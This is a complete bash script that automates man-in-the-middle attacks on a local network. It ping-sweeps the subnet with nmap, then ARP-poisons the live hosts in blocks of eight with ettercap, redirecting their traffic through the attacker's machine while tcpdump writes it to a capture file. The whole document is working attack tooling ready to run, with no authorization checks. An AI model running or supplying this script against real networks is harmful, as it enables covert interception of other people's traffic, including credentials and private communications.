#!/bin/bash
ShowUsage() {
	echo ""
	echo "Usage: $0 <base name> [Optional time per host]"
	echo "$0 will do a ping discovery on the local subnet and cycle through blocks of 8 hosts at a time doing ARP poisoning and recording the packets to pcap files."
	echo "By default, hosts will be poisoned for 8 minutes at a time.  An optional time can be specified to override this value.  Format is specified such as 7m 30s 1h."
	echo ""
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

BASENAME="$1"
MYIP=`ifconfig eth0 | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1`
GATEWAY=`route -n | grep "^0.0.0.0" | sed "s|^0.0.0.0\s||" | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1`
LOCALSUBNET=`ifconfig eth0 | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1 | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`
LOCALSUBNET=`echo "$LOCALSUBNET.0/24"`

ARPINTERFACE="eth0"

# NUMCORES=`cat /proc/cpuinfo | awk '/^processor/{print $3}' | wc -l`
# echo "[`date`] Tuning to number of CPU cores..."
MAXRUNNINGPOISONS=8
MAXPOISONTIME="8m"

if [ $# -ge 2 ]; then
	MAXPOISONTIME=$2
fi

echo ""
echo "[`date`] Started automated MitM captures for $LOCALSUBNET on $ARPINTERFACE."
echo "         Systems will be poisoned in blocks of $MAXRUNNINGPOISONS at $MAXPOISONTIME per system..."
echo ""
nmap -sn -oA $BASENAME $LOCALSUBNET > /dev/null

LIVEHOSTS=`cat $BASENAME.gnmap | grep "Status: Up" | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`
LIVEHOSTS=`echo "$LIVEHOSTS" | grep -v -e $MYIP -e $GATEWAY`
NUMHOSTS=`echo "$LIVEHOSTS" | wc -l`

echo "[`date`] Found $NUMHOSTS live hosts.  Starting packet capture..."
tcpdump -i eth0 -w $BASENAME.cap 1>/dev/null 2>/dev/null &
echo ""
HOSTCOUNT=0
INCREMENTALCOUNT=0
POISONHOSTSTRING=""

for CURHOST in $LIVEHOSTS; do
	# Note -u says unoffensive (let kernel handle ip_forwarding). -D deamonize.  Needed for performance or

	HOSTCOUNT=$((HOSTCOUNT+1))
	INCREMENTALCOUNT=$((INCREMENTALCOUNT+1))
	
	if [ ${#POISONHOSTSTRING} -gt 0 ]; then
		POISONHOSTSTRING=`echo "$POISONHOSTSTRING;$CURHOST"`
	else
		POISONHOSTSTRING=$CURHOST
	fi

	if [ $INCREMENTALCOUNT -eq $MAXRUNNINGPOISONS -o $HOSTCOUNT -eq $NUMHOSTS ]; then
		echo "[`date`] Poisoning $POISONHOSTSTRING for $MAXPOISONTIME..."
		#	timeout $MAXPOISONTIME ettercap -Toq -M arp:remote -w $CURHOST.cap -i $ARPINTERFACE /$POISONHOSTSTRING/ /$GATEWAY/ 2>&1 1>/dev/null &
		timeout $MAXPOISONTIME ettercap -Toq -M arp:remote -i $ARPINTERFACE /$POISONHOSTSTRING/ /$GATEWAY/ 2>&1 1>/dev/null
		INCREMENTALCOUNT=0
	fi
done

while true; do
	RUNNINGCOUNT=`ps aux | grep timeout | grep ettercap | wc -l`
	if [ $RUNNINGCOUNT -ge 1 ]; then
		echo -n "."
		sleep 10s
	else
		echo ""
		break
	fi
done


clear

# Stop the capture
pkill tcpdump

echo "[`date`] Done.  Poisoned $NUMHOSTS for $MAXPOISONTIME and wrote output to $BASENAME.cap"



